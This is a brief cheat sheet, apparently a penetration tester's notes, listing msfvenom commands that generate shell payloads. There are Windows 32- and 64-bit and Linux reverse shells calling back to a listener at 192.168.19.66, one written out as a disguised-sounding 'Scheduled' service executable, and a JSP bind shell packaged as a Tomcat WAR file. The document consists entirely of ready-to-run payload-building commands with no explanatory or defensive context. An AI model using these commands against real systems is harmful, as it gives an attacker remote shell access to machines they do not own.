# msfvenom

### windows 32bit

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.66 LPORT=1337 -b "\x00\x04\x58\x9d\xad\xe7\x0a\x0d" -f python
```

### windows 64bit - executable

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.19.66 LPORT=443 -f exe-service -o Scheduled.exe-service
```

### linux 64bit - executable

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.19.66 LPORT=4080 -f elf -o rce
```

### java classic tomcat `*.war` file

```bash
msfvenom -p java/jsp_shell_bind_tcp LPORT=60001 -f war > shell.war
```
